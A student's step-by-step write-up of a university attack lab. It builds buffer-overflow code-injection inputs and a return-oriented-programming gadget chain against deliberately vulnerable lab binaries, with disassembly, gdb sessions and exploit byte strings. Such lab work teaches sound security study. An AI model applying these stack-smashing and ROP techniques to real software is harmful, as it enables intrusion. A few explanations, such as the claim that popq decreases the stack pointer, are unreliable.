# Attack lab

By Adrian Borup (adbo@itu.dk).

## Part I: Code Injection Attacks

### Level 1

We start by inspecting the assembly to find the address of the `touch1` function:

```asm
$ objdump -D ctarget | grep -A 14 "<touch1>"
0000000000402698 <touch1>:
  402698:       f3 0f 1e fa             endbr64
  40269c:       50                      push   %rax
  40269d:       58                      pop    %rax
  40269e:       48 83 ec 08             sub    $0x8,%rsp
  4026a2:       c7 05 50 82 0f 00 01    movl   $0x1,0xf8250(%rip)        # 4fa8fc <vlevel>
  4026a9:       00 00 00
  4026ac:       48 8d 3d 58 5c 0c 00    lea    0xc5c58(%rip),%rdi        # 4c830b <_IO_stdin_used+0x30b>
  4026b3:       e8 a8 a2 01 00          callq  41c960 <_IO_puts>
  4026b8:       bf 01 00 00 00          mov    $0x1,%edi
  4026bd:       e8 f4 04 00 00          callq  402bb6 <validate>
  4026c2:       bf 00 00 00 00          mov    $0x0,%edi
  4026c7:       e8 64 fb 00 00          callq  412230 <exit>

00000000004026cc <touch2>:
```

Our goal is now to overwrite the return address after `getbuf` so it points to `0x402698`. We want to know the size of the stack frame so we can overwrite the return address. Let's check out `getbuf`'s assembly code:

```asm
$ objdump -D ctarget | grep -A 9 -m 1 "<getbuf>"
000000000040267e <getbuf>:
  40267e:       f3 0f 1e fa             endbr64
  402682:       48 83 ec 28             sub    $0x28,%rsp
  402686:       48 89 e7                mov    %rsp,%rdi
  402689:       e8 b5 02 00 00          callq  402943 <Gets>
  40268e:       b8 01 00 00 00          mov    $0x1,%eax
  402693:       48 83 c4 28             add    $0x28,%rsp
  402697:       c3                      retq

0000000000402698 <touch1>:
```

At instruction `0x40267e`, we can see an integer constant `$0x28`, which is 40 in base 10. The return address, `%rsp`, is decremented with these 40 bytes - therefore our stack frame must be 40 bytes in size. We can confirm this by seeing if the program starts to misbehave between 39 and 40 bytes of input:

```sh
# File contains 39 bytes:
$ cat inp.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00

# Pipe 39 bytes into the program:
$ cat inp.txt | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:No exploit.  Getbuf returned 0x1
Normal return

# Pipe one more byte into the program:
$ (cat inp.txt; echo " 00") | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
```

Yup! Boom. The segfault happens when we feed 40 bytes. Therefore, let's try to add another word (8 bytes) to the input so those bytes will overwrite the return address:

```diff
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
+ 98 26 40 00 00 00 00 00
```

Here we've inserted the address of `touch1` (with the bytes reversed to obtain little-endian order). By feeding this to the vulnerable program, we see that the return address is indeed overwritten, and the instructions from `touch1` are executed:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 2

First, let's locate `touch2`, and let's see what our unique cookie looks like:

```asm
$ objdump -D ctarget | grep -A 5 "<touch2>"
00000000004026cc <touch2>:
  4026cc:       f3 0f 1e fa             endbr64
  4026d0:       50                      push   %rax
  4026d1:       58                      pop    %rax
  4026d2:       48 83 ec 08             sub    $0x8,%rsp
  4026d6:       89 fa                   mov    %edi,%edx

$ cat cookie.txt
0x5d21660e 
```

Excellent - we can now write our exploit code. We'll do it in raw assembly:

```asm
# The %rdi register holds the first function argument. We write our cookie value
# into that register, so touch2 will receive it as the val argument.
mov $0x5d21660e,%rdi

# We push a return address onto the stack - in this case the address of touch2
push $0x4026cc

# Return, which will pop the stack and go to that address
ret
```

To obtain the byte representation of our exploit code, we save the above code in `exploit.s` and compile it:

```asm
$ gcc -c exploit.s && objdump -D exploit.o

exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 0e 66 21 5d    mov    $0x5d21660e,%rdi
   7:   68 cc 26 40 00          pushq  $0x4026cc
   c:   c3                      retq
```

One last thing before we write our buffer overflow input: we need the address of our exploit code. First, let's overwrite the stack frame with these 39 bytes of input:

```sh
$ cat test.txt
12 34 56 78 90 ab cd ef
11 11 11 11 22 22 22 22
33 33 33 33 44 44 44 44
55 55 55 55 66 66 66 66
77 77 77 77 88 88 88

$ cat test.txt | ./hex2raw > test.bin
```

Then we can use GDB to inspect the values of the memory in the stack frame. From earlier, we know that `0x40268e` is the address of the instruction after `Gets` returns in `getbuf` (i.e. when our buffer overflow should have completed).

```sh
$ gdb ./ctarget
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
...
Reading symbols from ./ctarget...

# Set breakpoint in getbuf right after Gets returns
(gdb) b *0x40268e
Breakpoint 1 at 0x40268e: file buf.c, line 15.

# Run the program with the above input
(gdb) r < test.bin
Starting program: /home/stud/adbo/exercises/22-Lab2-attacklab/target22/ctarget < test.bin
Cookie: 0x5d21660e

Breakpoint 1, getbuf () at buf.c:15
15      buf.c: No such file or directory.

# Starting from the stack pointer (register %rsp - the top of the stack), show
# the address and value of the next 48 bytes. That is, the stack frame and the
# following return address.
(gdb) x/48bx $rsp
0x55609288:     0x12    0x34    0x56    0x78    0x90    0xab    0xcd    0xef
0x55609290:     0x11    0x11    0x11    0x11    0x22    0x22    0x22    0x22
0x55609298:     0x33    0x33    0x33    0x33    0x44    0x44    0x44    0x44
0x556092a0:     0x55    0x55    0x55    0x55    0x66    0x66    0x66    0x66
0x556092a8:     0x77    0x77    0x77    0x77    0x88    0x88    0x88    0x00
0x556092b0:     0x79    0x28    0x40    0x00    0x00    0x00    0x00    0x00
```

We can see that our input bytes start at address `0x55609288`. The last line shows the address (`0x402879`) of the original instruction that we would normally return to - but we will overwrite this address with the address to our exploit code instead. It should be noted at we do not need to put our exploit code precisely at `$rsp` - we could put it anywhere inside the shown memory as long as we "return" to that place in the memory.

We can now create our final buffer overflow input:

```hex
$ cat inp.txt
/* Exploit code */
48 c7 c7 0e 66 21 5d    /* mov    $0x5d21660e,%rdi */
68 cc 26 40 00          /* pushq  $0x4026cc */
c3                      /* retq */

/* Padding */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Address of our exploit code */
88 92 60 55 00 00 00 00
```

And feed it to the vulnerable program:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch2!: You called touch2(0x5d21660e)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 3

We start by learning some things about `touch3`:

```asm
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004027f1 <+0>:     endbr64
   0x00000000004027f5 <+4>:     push   %rbx
   0x00000000004027f6 <+5>:     mov    %rdi,%rbx
   0x00000000004027f9 <+8>:     movl   $0x3,0xf80f9(%rip)        # 0x4fa8fc <vlevel>
   0x0000000000402803 <+18>:    mov    %rdi,%rsi
   0x0000000000402806 <+21>:    mov    0xf80f8(%rip),%edi        # 0x4fa904 <cookie>
   0x000000000040280c <+27>:    callq  0x402736 <hexmatch>
   0x0000000000402811 <+32>:    test   %eax,%eax
   0x0000000000402813 <+34>:    je     0x402842 <touch3+81>
   0x0000000000402815 <+36>:    mov    %rbx,%rdx
   0x0000000000402818 <+39>:    lea    0xc5b61(%rip),%rsi        # 0x4c8380
   0x000000000040281f <+46>:    mov    $0x1,%edi
   0x0000000000402824 <+51>:    mov    $0x0,%eax
   0x0000000000402829 <+56>:    callq  0x459ce0 <__printf_chk>
   0x000000000040282e <+61>:    mov    $0x3,%edi
   0x0000000000402833 <+66>:    callq  0x402bb6 <validate>
   0x0000000000402838 <+71>:    mov    $0x0,%edi
   0x000000000040283d <+76>:    callq  0x412230 <exit>
   0x0000000000402842 <+81>:    mov    %rbx,%rdx
   0x0000000000402845 <+84>:    lea    0xc5b5c(%rip),%rsi        # 0x4c83a8
   0x000000000040284c <+91>:    mov    $0x1,%edi
   0x0000000000402851 <+96>:    mov    $0x0,%eax
   0x0000000000402856 <+101>:   callq  0x459ce0 <__printf_chk>
   0x000000000040285b <+106>:   mov    $0x3,%edi
   0x0000000000402860 <+111>:   callq  0x402c8a <fail>
   0x0000000000402865 <+116>:   jmp    0x402838 <touch3+71>
End of assembler dump.
```

We learn that `touch3` has the address `0x4027f1`. Besides, we learn that `hexmatch` is called before printing our cookie. Let's look at that function:

```
(gdb) disas hexmatch
Dump of assembler code for function hexmatch:
   0x0000000000402736 <+0>:     endbr64
   0x000000000040273a <+4>:     push   %r13
   0x000000000040273c <+6>:     push   %r12
   0x000000000040273e <+8>:     push   %rbp
   0x000000000040273f <+9>:     push   %rbx
   0x0000000000402740 <+10>:    sub    $0x88,%rsp   // <- stack frame size
   0x0000000000402747 <+17>:    mov    %edi,%ebp
   0x0000000000402749 <+19>:    mov    %rsi,%rbx
   0x000000000040274c <+22>:    mov    $0x28,%r12d
```

The size of `hexmatch`'s stack frame is higher than that of `getbuf`, meaning that if we overwrite the contents of `getbuf`'s stack frame, those changes will be overwritten by `hexmatch`. We can't store our string there - bummer. But when in doubt, go bigger! If we just write way beyond the stack frame, we should be fine!

First step: get the byte representation of our cookie:

```sh
$ cat cookie.txt
0x5d21660e

(gdb) x/8 "5d21660e"
0x7ffff7de71f0: 0x35    0x64    0x32    0x31    0x36    0x36    0x30    0x65
```

Using the same methodology as in the previous phase, let's set the argument of `touch3` with:

```asm
mov $0x55609310,%rdi # memory location of the string
push $0x4027f1 # the address of touch3
ret
```

And compile it:

```sh
$ gcc -c exploit.s && objdump -D exploit.o

exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 10 93 60 55    mov    $0x55609310,%rdi
   7:   68 f1 27 40 00          pushq  $0x4027f1
   c:   c3                      retq
```

Let's make the exploit input: do the same as before, add a heckin' amount of padding to write beyond the current stack frame, and then the bytes of our string:

```asm
$ cat inp.txt
/* Exploit code */
48 c7 c7 10 93 60 55    /* mov    $0x55609310,%rdi */
68 f1 27 40 00          /* pushq  $0x4027f1 */
c3                      /* retq */

/* Padding */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Address of our exploit code */
88 92 60 55 00 00 00 00

/* Padding - outside the stack frame */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Our string bytes */
35 64 32 31 36 36 30 65
```

I found the address of the string by running the program with this input and checking where the bytes are in memory:

```sh
$ ./hex2raw < inp.txt > inp.bin

$ gdb ./ctarget
# ...
Reading symbols from ./ctarget...

# Breakpoint after reading input
(gdb) b *0x40268e
Breakpoint 1 at 0x40268e: file buf.c, line 15.

# Run with input
(gdb) r < inp.bin
Starting program: /home/stud/adbo/exercises/22-Lab2-attacklab/target22/ctarget < inp.bin
Cookie: 0x5d21660e

Breakpoint 1, getbuf () at buf.c:15
15      buf.c: No such file or directory.

# Print 150 bytes from the top of the stack frame
(gdb) x/150bx $rsp
0x55609288:     0x48    0xc7    0xc7    0x10    0x93    0x60    0x55    0x68
0x55609290:     0xf1    0x27    0x40    0x00    0xc3    0x00    0x00    0x00
0x55609298:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092a0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092b0:     0x88    0x92    0x60    0x55    0x00    0x00    0x00    0x00
0x556092b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092c0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092d0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092d8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092e0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092e8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092f0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556092f8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55609300:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55609308:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
# And here our string bytes are at 0x55609310:
0x55609310:     0x35    0x64    0x32    0x31    0x36    0x36    0x30    0x65
0x55609318:     0x00    0xf4    0xf4    0xf4    0xf4    0xf4

# Print address for sanity check - it yields our cookie, yay!
(gdb) p (char *) 0x55609310
$1 = 0x55609310 "5d21660e"
```

See it all work:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch3!: You called touch3("5d21660e")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

#### A small side note

I was initially trying to write the string bytes as part of my exploit code (using registers and `movabs`), writing it to overwrite the area of memory where the code for `touch1` is. But this fails with a segmentation fault since that memory area is not writable. TIL.

## Part II: Return-Oriented Programming

### Level 1

We start by finding out which functions we can use - these will be any functions between `start_farm` and `end_farm`:

```sh
$ objdump -D rtarget | grep -E 'start_farm|end_farm'
0000000000402896 <start_farm>:
0000000000402a61 <end_farm>:
```

Thus, our functions will be between `0x402896` and `0x402a61`. To make it a bit easier to search, it can be useful to create a file containing this region of the object dump. After all, it's easier to search a 7511 byte file than a 1568476 byte file.

```sh
$ objdump -D rtarget > farm.objdump
$ vim farm.objdump
# delete lines until start_farm and after end_farm
```

Our goal is the same as Part I, level 2: call `touch2` and passing our cookie as the argument. To pass the argument, we need to write our cookie to the `%rdi` register. The easiest way to do this would be to just `mov` it in there - however, that would require all of `movq $0x5d21660e,%rdi` to be present in some gadget, which is very unlikely. Let's try searching for the byte `5d` anyway:

```sh
$ grep '5d' farm.objdump
# nothing
```

Nothing. Since we can overflow the buffer and thus control the values on the stack, maybe we can find a `pop` instruction that will pop the cookie (which we can write to the stack) off the stack into `%rdi`. The provided instruction tables show that `popq %rdi` is encoded as the byte `5f`. Let's search for that:

```sh
$ grep '5f' farm.objdump
000000000040295f <addval_359>:
  40295f:       f3 0f 1e fa             endbr64
```

It only shows up in the address of the instructions, bummer. Maybe we can `pop` into another register and then copy the value from that register into `%rdi`. These are all the `popq` encodings:

| **Register R** | `%rax` | `%rcx` | `%rdx` | `%rbx` | `%rsp` | `%rbp` | `%rsi` | `%rdi` |
|----------------|--------|--------|--------|--------|--------|--------|--------|--------|
| **`popq R`**   | `58`   | `59`   | `5a`   | `5b`   | `5c`   | `5d`   | `5e`   | `5f`   |

We tried `%rdi`, let's keep going. I'll use an [online disassembler](https://onlinedisassembler.com/odaweb/lH9MfnFs/0) to see what instructions a sequence of bytes results in.

1. `%rsi`, nope:
   ```sh
   $ grep '5e' farm.objdump
     40295e:       c3                      retq
   ```
1. We'll skip `%rbp` and `%rsp` to avoid messing with returns
1. `%rbx`:
   ```sh
   $ grep '5b' -A 1 farm.objdump
     4028c5:       b8 5b 14 78 90          mov    $0x9078145b,%eax
     4028ca:       c3                      retq
   ```
   There is potential here since `5b` is followed shortly by a `c3` (the `ret` instruction). But the instructions between `5b` and `c3` cause a segmentation fault if we run them, yikes.
1. `%rdx`, nope:
   ```sh
   $ grep '5a' farm.objdump
     402a5a:       8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
   ```
1. `%rcx`, nope:
   ```sh
   $ grep '59' farm.objdump
   000000000040295f <addval_359>:
   ```
1. `%rax`, yes! Many candidates:
   ```sh
   $ grep '58' farm.objdump
     4028cf:       c7 07 a1 58 c3 0a       movl   $0xac358a1,(%rdi)
     4028ef:       b8 58 90 90 c3          mov    $0xc3909058,%eax
   0000000000402913 <addval_358>:
     402958:       c7 07 81 c1 08 c0       movl   $0xc008c181,(%rdi)
     4029ce:       b8 58 89 e0 90          mov    $0x90e08958,%eax
   ```

   The first search hit shows `58` followed by `c3` - that's just `popq %rax` and then `ret`, perfect! There is also `58 90 90 c3` which is `popq %rax`, `nop`, `nop`, and then `ret` - equally viable. We will make use of the first one.

We've found some suitable bytes we can use as instructions at the line `4028cf` in the file. We want `58 c3`, which start at the 4th byte - thus our gadget address becomes `4028cf + 3 = 4028d2`.

However, the only thing we have achieved so far is a way to save the cookie in `%rax` - we still need to be able to somehow move it to `%rdi`. If there is a `movq %rax,%rdi` encoding somewhere, that would be great! Otherwise, we need to get a bit more creative.

The provided instruction table shows that `movq %rax,%rdi` is encoded as `48 89 c7`. Let's see if that exists:

```sh
$ grep '48 89 c7' -A 1 farm.objdump # would not catch if the bytes were split on multiple lines
  4028a4:       8d 87 4c 48 89 c7       lea    -0x3876b7b4(%rdi),%eax
  4028aa:       c3                      retq
--
  4028da:       c7 07 48 89 c7 91       movl   $0x91c78948,(%rdi)
  4028e0:       c3                      retq
--
  4028e5:       b8 75 48 89 c7          mov    $0xc7894875,%eax
  4028ea:       c3                      retq
```

There are three occurrences of that byte sequence, two of which are followed by `c3` - perfect. It's almost like the lecturers planted these intentionally! Let's use the latter result: `48` is the third byte, so it's address is `4028e5 + 2 = 4028e7`.

Lastly, we need the address of `touch2`:

```
$ objdump -D rtarget | grep "<touch2>"
00000000004026cc <touch2>:
```

We are now ready to implement our exploit string. I'll paste it here and explain it afterwards:

```asm
/* Padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

d2 28 40 00 00 00 00 00 /* Address of our `popq %rax` gadget */
0e 66 21 5d 00 00 00 00 /* Our cookie */
e7 28 40 00 00 00 00 00 /* Address of our `movq %rax,%rdi` gadget */
cc 26 40 00 00 00 00 00 /* Address of touch2 */
```

What happens is as follows:

1. `Gets` reads our input and overflows the buffer as in all the other assignments
1. We overwrite the location on the stack that held the return address with `0x4028d2`, the address of our first gadget
1. Right below that, we write the value of our cookie. After `getbuf` returns, this location will be the top of the stack. This will be important.
1. The program "returns" and starts reading our gadget bytes as instructions:
   1. `58` is `popq %rax`, popping a value off the stack and into `%rax`. Our cookie is currently the top of the stack, so `%rax` now contains our cookie.
   1. When `popq` is executed, the stack pointer is decreased, so it now points to the third line of our exploit: the address of our second gadget.
   1. `c3` is `retq`, returning to the address on the top of the stack.
1. The program "returns" and starts reading our second gadget's bytes as instructions:
   1. `48 89 c7` is `movq %rax,%rdi`, which copies our cookie value from `%rax` to `%rdi`. Recall that `%rdi` holds the first argument to `touch2`, so we have now "passed" the argument.
   1. `c3` is `retq`, returning to the address on the top of the stack, which is now the address of `touch2`.
1. Success:
   ```sh
   $ cat inp.txt | ./hex2raw | ./rtarget
   Cookie: 0x5d21660e
   Type string:Touch2!: You called touch2(0x5d21660e)
   Valid solution for level 2 with target rtarget
   PASS: Sent exploit string to server to be validated.
   NICE JOB!
   ```
